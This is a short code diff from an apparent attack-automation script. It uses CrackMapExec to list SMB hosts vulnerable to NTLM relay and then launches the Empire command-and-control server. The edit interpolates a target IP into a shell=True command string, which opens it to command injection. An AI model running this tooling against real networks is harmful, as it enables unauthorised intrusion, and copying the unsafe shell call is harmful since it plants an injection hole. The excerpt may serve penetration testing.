@@ -63,7 +63,7 @@ def main():
         print("Getting relay target list using CrackMapExec...")
         print("This can take a few minutes on a full subnet - we need to find a more efficient way to do this part...")
         subprocess.Popen("touch targets.txt", shell=True).wait()
-        subprocess.Popen("cme --timeout 15 smb $CIDR --gen-relay-list targets.txt", shell=True).wait()
+        subprocess.Popen("cme --timeout 15 smb %s --gen-relay-list targets.txt" % (target_ip), shell=True).wait()
     
     print("\nLaunching Empire (waiting 10s)...")
     command = 'cd /opt/Empire && ./empire --rest --username %s --password %s' % (empire_user, empire_pass)
